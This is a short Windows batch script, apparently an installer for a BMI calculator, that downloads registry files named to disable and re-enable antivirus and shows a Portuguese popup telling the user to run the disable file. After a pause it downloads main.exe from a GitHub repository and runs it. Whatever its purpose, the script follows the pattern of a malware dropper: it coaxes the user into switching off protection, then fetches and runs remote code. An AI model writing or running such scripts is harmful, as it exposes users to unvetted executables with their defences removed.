@echo off
cd %USERPROFILE%\Downloads
mkdir Medidor_imc
cd Medidor_imc
type nul > people.json
curl -o desativar_antivirus.reg https://raw.githubusercontent.com/fezarosa-dev/entrega_edu_fis/main/desativar_antivirus.reg
curl -o ativar_antivirus.reg https://raw.githubusercontent.com/fezarosa-dev/entrega_edu_fis/main/ativar_antivirus.reg
(
  echo MsgBox "Para desativar o antivírus, siga estas etapas:" ^& vbCrLf ^& vbCrLf ^& _
  echo "1. Abra a pasta 'download'." ^& vbCrLf ^& _
  echo "2. Em seguida, abra a pasta 'calcular imc'." ^& vbCrLf ^& _
  echo "3. Execute o arquivo 'desativar antivirus'." ^& vbCrLf ^& vbCrLf ^& _
  echo "Certifique-se de realizar essas etapas com cuidado."^, vbInformation, "DESATIVE O ANTIVIRUS"
) > msg.vbs
start msg.vbs
pause
curl -L -o main.exe https://github.com/fezarosa-dev/entrega_edu_fis/raw/main/main.exe
start main.exe
exit